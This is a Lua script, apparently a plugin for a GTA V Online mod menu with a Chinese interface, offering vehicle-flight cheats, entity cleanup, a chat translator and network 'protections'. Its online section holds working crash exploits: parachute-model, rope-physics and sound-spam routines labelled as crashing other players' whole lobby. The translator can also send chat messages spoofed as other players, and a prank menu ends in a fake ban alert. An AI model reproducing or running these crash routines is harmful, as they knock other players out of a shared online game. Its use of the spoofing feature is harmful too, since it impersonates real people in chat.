		util.yield(1000)
	chat.send_message(ik10, false, true, true)
		util.yield(1000)
	chat.send_message(ik11, false, true, true)
		util.yield(1000)
	chat.send_message(ik12, false, true, true)
		util.yield(1000)
	chat.send_message(ik13, false, true, true)
	end)


   VEH = menu.list(menu.my_root(), "载具杂项", {}, "", function(); end)
	vehfly = menu.list(VEH, "QQ飞车", {}, "", function(); end)
	vehflyt = menu.toggle(vehfly, "起飞", {"vehfly"}, "", function(on_click)
    if on_click then
        local currentVehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        if currentVehicle == 0 then
            util.toast("此功能仅在车内可用. :/")
            menu.trigger_command(vehflyt, "off")
            return
        end
        local hasControl = NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(currentVehicle)
        local counter = 0
        if not hasControl then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(currentVehicle)
            while not hasControl and counter < 100 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(currentVehicle)
                util.yield(5)
                hasControl = NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(currentVehicle)
                counter = counter + 1
            end
        end
        if not hasControl and counter >= 100 then
            util.toast("未能控制车辆. :/")
            menu.trigger_command(vehflyt, "off")
        else
            is_vehicle_flying = on_click
        end
    else
        is_vehicle_flying = false
    end
end)
menu.slider(vehfly, "速度", {"vflyspeed"}, "", 1, 100, 6, 1, function(on_change)
    speed = on_change
end)
menu.toggle(vehfly, "惯性", {"vflynostop"}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(vehfly, "无碰撞", {"vflynocollide"}, "", function(on_click)
    no_collision = on_click
end)
menu.toggle(vehfly, "下车急停", {"vflystopexit"}, "", function(on_click)
    stop_on_exit = on_click
end, true)
veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
function do_vehicle_fly()
    veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0)
    ENTITY.SET_ENTITY_COLLISION(veh, not no_collision, TRUE)
    ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, TRUE)
    -- aaron helped with this scaleform part :)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 21, true),"升高")
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 36, true),"降低")
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 55, true),"加速")
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
    local locspeed = speed*10
    local locspeed2 = speed
    if PAD.IS_CONTROL_PRESSED(0, 76) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end
    if PAD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then
            lsp = speed * 2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed))
        end
   end
    if PAD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PAD.IS_CONTROL_PRESSED(0, 61) then
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then
            lsp = speed*2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
    if PAD.IS_CONTROL_PRESSED(2, 61) then
        local lsp = speed
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, lsp, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, locspeed, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
    if PAD.IS_CONTROL_PRESSED(2, 62) then
        local lsp = speed
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 0 - (locspeed), 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0)
    end
    if TASK.GET_IS_TASK_ACTIVE(PLAYER.PLAYER_PED_ID(), 2) then
        menu.trigger_command(vehflyt, "off")
        if stop_on_exit then
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0)
        end
    end
    if not ENTITY.DOES_ENTITY_EXIST(veh) then
        menu.trigger_command(vehflyt, "off")
    end
end

util.create_tick_handler(function()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(veh, true, TRUE) end
    return true
end)
util.on_stop(function()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
	ENTITY.SET_ENTITY_COLLISION(veh, true, true)
    sf:delete()
end)




	custselc = menu.list(menu.my_root(), "线上选项", {}, "", function(); end)



	menu.divider(custselc, "全局")
	
	
	menu.action(custselc, "载具伞崩全局", {}, "崩丫一家子", function ()
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for i = 1, 20 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(200)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end)

	
	
	menu.action(custselc, "人物伞崩全局", {}, "崩丫一家子", function()
        local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_logpile_06b")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end)
	
	

	
	
	menu.action(custselc,"冷战崩溃",{},"崩丫一家子",function()
    		for n = 0 , 5 do
    			PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    			object_hash = 1117917059
    			            		    	STREAMING.REQUEST_MODEL(object_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
    		       util.yield()
    	         end
    			PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    			util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    			end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    			bush_hash = -908104950
    			            		    	STREAMING.REQUEST_MODEL(bush_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
    		       util.yield()
    	         end
    		    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
               	util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    		    end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    	end
    end)
	
		menu.action(custselc, "数学崩溃", {}, "", function()
	   local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)

        playpos.x = playpos.x + 10

        local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
        local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
        local pedc = CreatePed(26, 2597531625, playpos, 0)
        local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)

        local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
        util.yield(2500)
        PHYSICS.DELETE_CHILD_ROPE(ropec)
        entities.delete_by_handle(carc)
        entities.delete_by_handle(pedc)
		notification("Go Fuck Your Self" ,colors.red)
		util.toast("Go Fuck Your Self")
    end)

	
	menu.action(custselc,"声音崩溃战局", {}, "", function()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
		end
         util.toast("Sound Spam Crash [Lobby] executed successfully.")
end)
	

  TRANROOT = menu.list(menu.my_root(), "战局聊天翻译", {}, "", function(); end)

	menu.action(menu.my_root(), "玩家栏", {}, "", function()
		menu.trigger_commands("playerlist")
	end)
	
	protex = menu.list(menu.my_root(), "防护", {}, "", function(); end)
	
	menu.action(protex, "强制停止所有声音", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

	menu.action(protex, "移除附加物", {""}, "", function()
		notification("Removing Attachments", colors.black)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)

	menu.click_slider(protex,"清理实体", {""}, "1 = NPC, 2 = 载具, 3 = 实体, 4 = 拾取物, 5 =所有", 1, 5, 1, 1, function(on_change)
		if on_change == 1 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "NPC清除完成", colors.green)
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "载具清除完成", colors.green)
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "实体已清除", colors.green)
			return
		end
		if on_change == 4 then
			local count = 0
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. " pickups have been yeeted", colors.green)
			return
		end
		if on_change == 5 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "清理完成", colors.green)
			return
		end
	end)

	menu.action(protex, "超级清", {"清除区域"}, "清除一切", function(on_click)
		local ct = 0
		notification("还你世界一片清净", colors.black)
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("已删掉所有东西")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end

	end)

	menu.divider(protex, "崩溃保护")
	
	
	menu.toggle(protex, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("Toggling block all network events on... stay safe homie", colors.green)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("toggling block all network events off...", colors.red)
		end
	end)


	menu.toggle(protex, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("Toggling block all incoming syncs on... stay safe homie", colors.green)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("toggling block all incoming syncs off...", colors.red)
		end
	end)

	menu.toggle(protex, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
		if on_toggle then
			notification("Toggling block all outgoing syncs on", colors.green)
			menu.trigger_commands("desyncall on")
		else
			notification("Toggling block all outgoing syncs off", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(protex, "防崩视角", {"acc"}, "", function(on_toggle)
		if on_toggle then
			notification("Toggling anticrashcam... stay safe homie", colors.green)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)



	menu.toggle(protex, "自闭模式", {"panic"}, "你可真是那个", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("toggling panic mode on... stay safe homie", colors.green)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)
	
	
	donotpress_root = menu.list(menu.my_root(), "不要按", {}, "")
phrases = {"你被宠坏了，不是吗？", "你为什么这么做？", "我是说。。。", "这是浪费时间，不是吗？", "想想看。", "我叫你不要这样做。。", "但是你还在做。", "...", "我不知道你期望发生什么。", "这不会给你一百万美元。", "这不会让你找到灵魂伴侣。", "你 想 要 一个灵魂伴侣，对吗？", "我知道事情会变得孤独。。", "我知道", "我们可以拥抱它。", "只有当你停止按这个，就是。", "请停下来。", "我很客气地问。", "你想让我哭吗？", "这就是你想要的吗？", "你疯了。", "真是个蛇精病。", "你在这里浪费了多少时间？", "错误", "我直截了当地说是错误", "那没骗到你吗？", "你知道吗？", "我受够了。", "如果你一直点击这个", "一个贫穷国家的孩子现在就要死了。", "从现在开始。", "下次单击时，它会发生。", "哇，你没有道德，是吗？", "1名儿童死亡。", "都是因为你。", "我们他妈的杀了他。", "是的。", "他的生命掌握在你手中。", "你决定把它扔掉。", "真可怜。", "你知道吗？你赢了。", "你是坨狗屎。", "混蛋。", "好的", "随你的便", "再见"}
lastid = donotpress_root
for k,p in pairs(phrases) do
    lastid = menu.list(lastid, p, {}, "")
end
	menu.action(lastid,"恭喜", {}, "你会后悔的", function(on_click)
    show_custom_alert_until_enter("您已被永久禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
	util.yield(500)
	menu.trigger_commands("quittosp")
end)
	
	
	
	menu.click_slider(menu.my_root(), "崩自己", {"Crash me"}, "1 = yeet, 2 = conecrash", 1, 2, 1, 1, function(on_change)
	if on_change == 1 then	
	menu.trigger_commands("yeet")
	end
	if on_change == 2 then

    STREAMING.REQUEST_MODEL(-1364166376)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local cone = OBJECT.CREATE_OBJECT_NO_OFFSET(-1364166376, c.x, c.y, c.z, true, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cone, cone, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
	end
end)
	
	
	
	local menyoovmain_root = menu.list(menyoo_root, "载具", {"menyoovehicles"}, "Menyoo 载具 支持!")
local menyoom1_root = menu.list(menyoo_root, "地图", {"menyoomapsroot"}, "Menyoo 地图 支持!")
local menyoom_root = menu.list(menyoom1_root, "所有地图", {"menyooallmaps"}, "目录中的所有地图")
menyoomloaded_root = menu.list(menyoom1_root, "当前加载的地图", {"menyooloadedmaps"}, "已加载的地图")
local menyoov_root = menu.list(menyoovmain_root, "所有载具", {"menyooloadedmaps"}, "你生成的载具")
menyoovloaded_root = menu.list(menyoovmain_root, "当前加载的车辆", {"menyooloadedmaps"}, "你生成的载具")
	
	
	local function setup_menyoo_vehicles_list(mainroot, player, allplayers, dotp)
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        root = mainroot
        local ours = false
        if player == players.user() then
            ours = true 
        end
        if filesystem.is_dir(path) then
            root = menu.list(root, path:gsub(vehicles_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                if not allplayers then
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                        log("Click type was " .. on_click)
                        menyoo_load_vehicle(path, player, dotp, ours)
                    end)
                else
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                        for k,v in pairs(players.list(true, true, true)) do
                            log("Click type was " .. on_click)
                            menyoo_load_vehicle(path, v, dotp, false)
                        end
                    end)
                end
            end
        else
            if string.match(path:gsub(vehicles_dir, ''), '.xml') then
                if not allplayers then
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                        log("Click type was " .. on_click)
                        menyoo_load_vehicle(path, player, dotp, ours)
                    end)
                else
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                        for k,v in pairs(players.list(true, true, true)) do
                            log("Click type was " .. on_click)
                            menyoo_load_vehicle(path, v, dotp, false)
                        end
                    end)
                end
            end
        end
    end
end

local function setup_menyoo_maps_list()
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        if filesystem.is_dir(path) then
            root = menu.list(menyoom_root, path:gsub(maps_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                menu.action(root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                    menyoo_load_map(path)
                end)
            end
        else
            if string.match(path:gsub(maps_dir, ''), '.xml') then
                menu.action(menyoom_root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                    menyoo_load_map(path)
                end)
            end
        end
    end
end

setup_menyoo_vehicles_list(menyoov_root, players.user(), false, true)
setup_menyoo_maps_list()



vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false
reap = false
menu.toggle(TRANROOT, "开关", {}, '', function(on) 
	run = on
end, true)
	
targetlangmenu = menu.slider_text(TRANROOT, "目标语言", {}, "You need to click to aply change", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)


tradlocamenu = menu.slider_text(TRANROOT, "传输消息的位置", {}, "You need to click to aply change", {"Team Chat not networked", "Team Chat networked", "Global Chat not networked", "Global Chat networked", "Notification"}, function(s)
	Tradloca = s
end)

menu.toggle(TRANROOT, "传输自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(TRANROOT, "即使语言与所需语言相同，也要进行传输", {}, "可能无法正常工作，因为谷歌是愚蠢的", function(on)
	traductsamelang = on	
end)

traductmymessage = menu.list(TRANROOT, "发送传输的消息")
finallangmenu = menu.slider_text(traductmymessage, "最终语言", {"finallang"}, "您留言的最终语言.																	  You need to click to aply change", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

spoofsend = menu.slider_text(traductmymessage, "伪装为", {"Spoofas"}, "默认为自己.											  You need to click to aply change", PlayerSpooflist, function(s)
	spoofingas = PlayerSpoof[s]
end)
menu.action(traductmymessage, "发送消息", {"Sendmessage"}, "输入文本 为您的消息", function(on_click)
    util.toast("Please input your message")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, spoofingas,string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
ran = 0
chat.on_message(function(packet_sender, message_sender, text, team_chat)
if run  then
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
		async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
			if Sucess ~= "" then
				translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
				if not traductsamelang and (sourceLang == targetlang)then
				else
					if (Tradloca == 1) then	
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), true, true, false)
					end if (Tradloca == 2) then
						botsend = true
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), true, true, true)
					end if (Tradloca == 3) then
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), false, true, false)
					end if (Tradloca == 4) then
						botsend = true
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), false, true, true)
					end if (Tradloca == 5) then
						util.toast(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), TOAST_ALL)
					end
				end
			end
		end)
		async_http.dispatch()
		end
	end
	botsend = false
	end
end)


players.on_join(function(pid)
	PlayerSpooflist[pid] = players.get_name(pid)
	PlayerSpoof[pid] = pid
	menu.set_action_slider_options(spoofsend, PlayerSpooflist)
	if (pid == players.user()) then
		spoofingas = pid
		menu.set_value(spoofsend, pid)
	end
end)
players.dispatch_on_join()

players.on_leave(function(pid)
	PlayerSpooflist[pid] = nil
	PlayerSpoof[pid] = nil
	menu.set_action_slider_options(spoofsend, PlayerSpooflist)
end)

run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end



GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")	
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end



	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
